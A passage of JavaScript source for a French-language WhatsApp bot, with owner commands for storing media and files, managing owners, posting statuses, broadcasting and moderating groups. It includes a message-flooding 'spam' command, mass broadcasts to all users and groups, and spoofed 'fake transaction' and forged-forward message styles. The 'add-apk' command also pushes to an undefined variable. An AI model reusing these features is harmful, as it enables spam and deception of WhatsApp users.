            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'add-video':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Whats the video name?')
if (VideoKev.includes(q)) return replygckev("The name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
VideoKev.push(q)
await fsx.copy(delb, `./KevFile/video/${q}.mp4`)
fs.writeFileSync('./KevFile/database/kevvideo.json', JSON.stringify(VideoKev))
fs.unlinkSync(delb)
replygckev(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'supp-video':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Enter the video name')
if (!VideoKev.includes(q)) return replygckev("The name does not exist in the database")
let wanu = VideoKev.indexOf(q)
VideoKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/kevvideo.json', JSON.stringify(VideoKev))
fs.unlinkSync(`./KevFile/video/${q}.mp4`)
replygckev(`Success deleting video ${q}`)
}
break
case 'liste-video':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoKev) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoKev.length}*`
replygckev(teks)
}
break
case 'add-image':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Whats the image name?')
if (ImageKev.includes(q)) return replygckev("The name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
ImageKev.push(q)
await fsx.copy(delb, `./KevFile/image/${q}.jpg`)
fs.writeFileSync('./KevFile/database/kevimage.json', JSON.stringify(ImageKev))
fs.unlinkSync(delb)
replygckev(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'supp-image':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Enter the image name')
if (!ImageKev.includes(q)) return replygckev("The name does not exist in the database")
let wanu = ImageKev.indexOf(q)
ImageKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/kevimage.json', JSON.stringify(ImageKev))
fs.unlinkSync(`./KevFile/image/${q}.jpg`)
replygckev(`Success deleting image ${q}`)
}
break
case 'liste-image':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageKev) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageKev.length}*`
replygckev(teks)
}
break
case 'add-sticker':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Whats the sticker name?')
if (StickerKev.includes(q)) return replygckev("The name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
StickerKev.push(q)
await fsx.copy(delb, `./KevFile/sticker/${q}.webp`)
fs.writeFileSync('./KevFile/database/KevSticker.json', JSON.stringify(StickerKev))
fs.unlinkSync(delb)
replygckev(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'supp-sticker':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Enter the sticker name')
if (!StickerKev.includes(q)) return replygckev("The name does not exist in the database")
let wanu = StickerKev.indexOf(q)
StickerKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/KevSticker.json', JSON.stringify(StickerKev))
fs.unlinkSync(`./KevFile/sticker/${q}.webp`)
replygckev(`Success deleting sticker ${q}`)
}
break
case 'liste-sticker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerKev) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerKev.length}*`
replygckev(teks)
}
break
case 'add-vn':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Whats the audio name?')
if (VoiceNoteKev.includes(q)) return replygckev("The name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
VoiceNoteKev.push(q)
await fsx.copy(delb, `./KevFile/audio/${q}.mp3`)
fs.writeFileSync('./KevFile/database/kevvn.json', JSON.stringify(VoiceNoteKev))
fs.unlinkSync(delb)
replygckev(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'supp-vn':{
if (!TontonKev) return KevStickOwner()
if (args.length < 1) return replygckev('Enter the vn name')
if (!VoiceNoteKev.includes(q)) return replygckev("The name does not exist in the database")
let wanu = VoiceNoteKev.indexOf(q)
VoiceNoteKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/kevvn.json', JSON.stringify(VoiceNoteKev))
fs.unlinkSync(`./KevFile/audio/${q}.mp3`)
replygckev(`Success deleting vn ${q}`)
}
break
case 'liste-vn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteKev) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteKev.length}*`
replygckev(teks)
}
break
case 'add-zip':{
if (!TontonKev) return KevStickOwner()

if (args.length < 1) return replygckev(`What's the zip name?`)
let teks = `${text}`
{
if (ZipKev.includes(teks)) return replygckev("This name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
ZipKev.push(teks)
await fsx.copy(delb, `./KevFile/zip/${teks}.zip`)
fs.writeFileSync('./KevFile/database/zip.json', JSON.stringify(ZipKev))
fs.unlinkSync(delb)
replygckev(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'supp-zip':{
if (!TontonKev) return KevStickOwner()

if (args.length < 1) return replygckev('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipKev.includes(teks)) return replygckev("This name does not exist in the database")
let wanu = ZipKev.indexOf(teks)
ZipKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/zip.json', JSON.stringify(ZipKev))
fs.unlinkSync(`./KevFile/zip/${teks}.zip`)
replygckev(`Successfully deleted zip ${teks}`)
}
}
break
case 'liste-zip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipKev) {
teksooooo += `│${setv} ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipKev.length}*`
replygckev(teksooooo)
}
break
case 'add-apk':{
if (!TontonKev) return KevStickOwner()

if (args.length < 1) return replygckev('What is the name of the apk?')
let teks = `${text}`
{
if (ApkKev.includes(teks)) return replygckev("This name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./KevFile/apk/${teks}.apk`)
fs.writeFileSync('./KevFile/database/apk.json', JSON.stringify(ApkKev))
fs.unlinkSync(delb)
replygckev(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'supp-apk':{
if (!TontonKev) return KevStickOwner()

if (args.length < 1) return replygckev('Name of the apk?')
let teks = `${text}`
{
if (!ApkKev.includes(teks)) return replygckev("This name does not exist in the database")
let wanu = ApkKev.indexOf(teks)
ApkKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/apk.json', JSON.stringify(ApkKev))
fs.unlinkSync(`./KevFile/apk/${teks}.apk`)
replygckev(`Successfully deleted Apk ${teks}`)
}
}
break
case 'liste-apk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkKev) {
teksoooooo += `│${setv} ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkKev.length}`
replygckev(teksoooooo)
}
break
case 'add-pdf':{
if (!TontonKev) return KevStickOwner()

if (args.length < 1) return replygckev('What is the name of the pdf')
let teks = `${text}`
{
if (DocKev.includes(teks)) return replygckev("This name is already in use")
let delb = await Kev.downloadAndSaveMediaMessage(quoted)
DocKev.push(teks)
await fsx.copy(delb, `./KevFile/doc/${teks}.pdf`)
fs.writeFileSync('./KevFile/database/doc.json', JSON.stringify(DocKev))
fs.unlinkSync(delb)
replygckev(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'supp-pdf':{
if (!TontonKev) return KevStickOwner()

if (args.length < 1) return replygckev('Enter the name')
let teks = `${text}`
{
if (!DocKev.includes(teks)) return replygckev("This name does not exist in the database")
let wanu = DocKev.indexOf(teks)
DocKev.splice(wanu, 1)
fs.writeFileSync('./KevFile/database/doc.json', JSON.stringify(DocKev))
fs.unlinkSync(`./KevFile/doc/${teks}.pdf`)
replygckev(`Successfully deleted pdf ${teks}`)
}
}
break
case 'liste-pdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocKev) {
teksoooo += `│${setv} ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocKev.length}*`
replygckev(teksoooo)
}
break
			case 'add-msg': {
				if (!TontonKev) return KevStickOwner()
				if (!m.quoted) return replygckev('Reply to messages you want to save in the database')
				if (!text) return replygckev(`Example : ${prefix + command} file name`)
				let msgs = global.db.database
				if (text.toLowerCase() in msgs) return replygckev(`'${text}' has been registered in the message list`)
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				replygckev(`Successfully added the message to the message list as '${text}'\nAccess with ${prefix}getmsg ${text}\nView the Message With ${prefix}listmsg`)
			}
			break
			case 'supp-msg': case 'deletemsg': {
				if (!TontonKev) return KevStickOwner()
				if (!text) return replygckev('The name of the message you want to delete?')
				let msgs = global.db.database
				if (text == 'allmsg') {
					global.db.database = {}
					replygckev('Successfully deleted all msgs from the message list')
				} else {
					if (!(text.toLowerCase() in msgs)) return replygckev(`'${text}' not listed in the message list`)
					delete msgs[text.toLowerCase()]
					replygckev(`Successfully deleted '${text}' from the message list`)
				}
			}
			break
			case 'voir-msg': {
				if (!text) return replygckev(`Exemple : ${prefix + command} file name\n\nView the list of messages with ${prefix}listmsg`)
				let msgs = global.db.database
				if (!(text.toLowerCase() in msgs)) return replygckev(`'${text}' not listed in the message list`)
				await Kev.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			}
			break
			case 'liste-msg': {
				let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
				let teks = '「 LIST DATABASE 」\n\n'
				for (let i of seplit) {
					teks += `${setv} *Nom :* ${i.nama}\n${setv} *Type :* ${getContentType(i.message)?.replace(/Message/i, '')}\n────────────────────────\n\n`
				}
				replygckev(teks)
			}
			break
			case 'add-proprio':
if (!TontonKev) return KevStickOwner()
if (!args[0]) return replygckev(`Usage ${prefix+command} numero\nExemple ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Kev.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygckev(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./recherche/owner.json', JSON.stringify(owner))
replygckev(`Le numero ${bnnd} est devenu proprio!!!`)
break
case 'supp-proprio':
if (!TontonKev) return KevStickOwner()
if (!args[0]) return replygckev(`Usage ${prefix+command} numero\nExemple ${prefix+command} 237656774511`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./recherche/owner.json', JSON.stringify(owner))
replygckev(`Le Numero ${ya} a ete supprimey de la liste des proprios!!!`)
break
case 'liste-proprio': {
                let teks = '┌──⭓「 *Liste Des  Proprios* 」\n│\n'
                for (let x of owner) {
                    teks += `│${setv} ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygckev(teks)
            }
            break
			case 'extinction':{
                if (!TontonKev) return KevStickOwner()
                replygckev(`le redemarrage sera complet bientot`)
                await sleep(3000)
                process.exit()
                }
            break
			  case 'user-id':
  case 'jid':
  case 'groupe-id':
            case 'id':{
            replygckev(m.chat)
           }
          break
			case 'voir-exif': case 'getwm': case 'getwatermark':{
                if (!TontonKev) return KevStickOwner()
               replygckev(`*Exif de ${botname} est*\n\n${setv} Nompackage : ${packname}\n${setv} Auteur : ${author}`)
               }
                break
                case 'voir-blocageauto': case 'getautoblockno': case 'getautoblock':{
                if (!TontonKev) return KevStickOwner()
               replygckev(`*le code bloquey automatiquement par ${botname} est*\n\n${setv}  Code : ${autoblocknumber}\n\n_Note: Lorsque le blocage auto est activey , les numeros commençant par le code selectionney seront bloqueys_`)
               }
                break
                case 'voir-antiforeign': case 'getantiforeignno': case 'getantiforeignnumber':{
                if (!TontonKev) return KevStickOwner()
               replygckev(`*Anti Foreign Country Code of ${botname} is*\n\n${setv} Country Code : ${antiforeignnumber}\n\n_Note: Once antiforeign number is activated in any group chat, only members related to this country code are allowed to stay in the group chat, others will be kicked immediately, if chatted._`)
               }
                break
			case 'mod-exif':
            case 'setwm':{
                if (!TontonKev) return KevStickOwner()
                if (!text) return replygckev(`Exemple : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygckev(`Exif modifiey en\n\n• Nom Package: ${global.packname}\n• Auteur : ${global.author}`)
                }
                break
			    case 'creer-goupe': case 'creategroup': {
if (!TontonKev) return KevStickOwner()
if (!args.join(" ")) return replygckev(`Usage ${prefix+command} nom du groupe`)
try {
let cret = await Kev.groupCreate(args.join(" "), [])
let response = await Kev.groupInviteCode(cret.id)
const teksop = `     「 Creer Groupe 」

▸ Nom : ${cret.subject}
▸ Proprio : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
Kev.sendMessage(m.chat, { text:teksop, mentions: await Kev.parseMention(teksop)}, {quoted:m})
} catch {
	replygckev(`Error`)
	}
}
break
			case 'reset-user':
            case 'resetdbuser': {
               if (!TontonKev) return KevStickOwner()
               let totalusernya = db.users[0]
               replygckev(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.users = []
            }
            break
			case 'reset-hit':
            case 'resettotalhit': {
               if (!TontonKev) return KevStickOwner()
               global.db.settings[botNumber].totalhit = 0
               replygckev(mess.done)
            }
            break
			case 'mod-reponse':{
               if (!TontonKev) return KevStickOwner()
               if (text.startsWith('s')) {
                  typereply = text
                  replygckev(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\Veuillez cliquer sur le bouton ci-dessous `
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNER LE MODE REPONSE",
"sections":[{"title":"MODE DE REPONSE",
"highlight_label":"PREFEREY DU PROPRIO",
"rows":[{"header":"CHAINE + LIEN THUMB",
"title":"SELECTION ",
"description":"CHAINE + LIEN THUMB",
"id":"${prefix+command} s4"},
{"header":"LONG LIEN + THUMBNAIL",
"title":"SELECTION ",
"description":"LONG LIEN + THUMBNAIL",
"id":"${prefix+command} s3"},
{"header":"LIEN + FAKE THUMBNAIL",
"title":"SELECTION ",
"description":"LIEN + FAKE THUMBNAIL",
"id":"${prefix+command} s2"},
{"header":"REPONSE NORMALE",
"title":"SELECTION ",
"description":"REPONSE NORMALE",
"id":"${prefix+command} s1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statut-texte': 
            case 'upswtext':
            case 'upswteks': {
               if (!TontonKev) return KevStickOwner()
               if (!q) return replygckev('Texte?')
               await Kev.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.users) })
               replygckev(mess.done)
            }
            break
            case 'statut-video':
            case 'upswvideo': {
               if (!TontonKev) return KevStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await Kev.downloadAndSaveMediaMessage(quoted)
                  await Kev.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users) })
                  await replygckev(mess.done)
               } else {
                  replygckev('Veuillez repondre a une video')
               }
            }
            break
            case 'statut-img':
            case 'statut-image':
            case 'upswimg': {
               if (!TontonKev) return KevStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await Kev.downloadAndSaveMediaMessage(quoted)
                  await Kev.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users)})
                  await replygckev(mess.done)
               } else {
                  replygckev('Veuillez repondre a une image ')
               }
            }
            break
            case 'statut-audio':
            case 'upswaudio': {
               if (!TontonKev) return KevStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await Kev.downloadAndSaveMediaMessage(quoted)
                  await Kev.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.users)
                  })
                  await replygckev(mess.done)
               } else {
                  replygckev('Veuillez repondre a un audio')
               }
            }
            break
			case 'mod-vidmenu':
            case 'svm': 
            	case 'mod-gifmenu':
            case 'sgm': {
                if (!TontonKev) return KevStickOwner()
                try {
                let delb = await Kev.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './KevFile/theme/Sylvers.mp4')
                fs.unlinkSync(delb)
                replygckev(mess.done)
                } catch {
                	replygckev(`Veuillez repondre a une courte video  ${prefix+command}`)
                }
            }
            break
			case 'mod-imgmenu':
            case 'sim': {
                if (!TontonKev) return KevStickOwner()
                try {
                let delb = await Kev.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './KevFile/theme/sylvers.jpg')
                fs.unlinkSync(delb)
                replygckev(mess.done)
                } catch {
                	replygckev(`Veuillez repondre a une image  ${prefix+command}`)
                }
            }
            break
			case 'mod-menu': {
            if (!TontonKev) return KevStickOwner()
            if (text.startsWith('s')) {
                  typemenu = text
                  replygckev(mess.done)
               } else {
               let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\Veuillez cliquer sur le bouton ci-dessous `
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNER LE MENU 🧾",
"sections":[{"title":"SELECTIONNER LE MENU APPROPRIEY",
"highlight_label":"LE PREFEREY DU PROPRIO",
"rows":[{"header":"BOUTON + CHAINE S2",
"title":"SELECTION ",
"description":"BOUTON + CHAINE S2",
"id":"${prefix+command} s12"},
{"header":"BOUTON + CHAINE",
"title":"SELECTION ",
"description":"BUTTON + CHANNEL",
"id":"${prefix+command} s11"},
{"header":"BOUTON SEUL",
"title":"SELECTION ",
"description":"BOUTON SEUL",
"id":"${prefix+command} s10"},
{"header":"CHAINE + FAKE THUMBNAIL S2",
"title":"SELECTION ",
"description":"CHAINE + FAKE THUMBNAIL S2",
"id":"${prefix+command} s9"},
{"header":"CHAINE + FAKE THUMBNAIL",
"title":"SELECTION ",
"description":"CHAINE + FAKE THUMBNAIL",
"id":"${prefix+command} s8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"SELECTION ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} s7"},
{"header":"FAUSSE TRANSACTION",
"title":"SELECTION ",
"description":"FAUSSE TRANSACTION",
"id":"${prefix+command} s6"},
{"header":"APPEL NUDEO",
"title":"SELECTION",
"description":"APPEL NUDEO",
"id":"${prefix+command} s5"},
{"header":"GIF THUMBNAIL",
"title":"SELECTION",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} s4"},
{"header":"VIDEO THUMBNAIL",
"title":"SELECTION",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} s3"},
{"header":"CHAINE + THUMBNAIL",
"title":"SELECTION",
"description":"CHAINE + THUMBNAIL",
"id":"${prefix+command} s2"},
{"header":"IMAGE THUMBNAIL",
"title":"SELECTION",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} s1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
			case 'bc':
            case 'broadcast': {
               if (!TontonKev) return KevStickOwner()
               if (!text) return replygckev('Texte?')
               let teksnya = `${text}\n\n\n\nDate: ${kevdate} ${kevheure}`
               for (let i of Object.keys(global.db.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await Kev.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await Kev.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await Kev.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygckev(` ${command} send avec succes a ${Object.keys(global.db.users).length}`)
            }
            break
            case 'bcgc':
            case 'broadcast-groupe': {
                if (!TontonKev) return KevStickOwner()
                if (!text) return replygckev(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await Kev.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygckev(`Broadcast Ses Avec Succes Dans ${anu.length} Groupe De Discussion, Temps Mis ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    Kev.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Send dans ${i.length} `,
                                thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygckev(`Broadcast Ses Avec Succes Dans ${anu.length}`)
            }
            break
			case 'spam':
				if (!TontonKev) return KevStickOwner()
					if (!text) return replygckev(`Usage ${prefix +command} texte|nombre`)
				kevarg = text.split("|")
				if (!kevarg) return replygckev(`Usage ${prefix+ command} texte|nombre`)
				if (Number(kevarg[1]) >= 50) return replygckev('Max 50!')
				if (isNaN(kevarg[1])) return replygckev(`Le Numero`)
				for (let i = 0; i < kevarg[1]; i++){
					Kev.sendMessage(m.chat, {text: kevarg[0]})
				}
				break
			case 'anti-foreign':{
            	if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antiforeignnum = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiforeignnum = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!TontonKev) return KevStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygckev(
                    `Entrez une question a deux options\nExemple: ${prefix}poll qui est le meilleur?|Kev,KenV,...`
                )
            try {
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await Kev.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
            } catch {
            	replygckev(
                    `Entrez une question a deux options\nExemple: ${prefix}poll qui est le meilleur?|Kev,KenV,...`
                )
                }
        }
        break
			case 'blocage-auto':
                if (!TontonKev) return KevStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].autoblocknum = true
                    replygckev(`Activey ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autoblocknum = false
                    replygckev(`Desactivey ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'groupe-uniquement':
            case 'groupe-unik':
                if (!TontonKev) return KevStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replygckev(`Activey ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlygrub = false
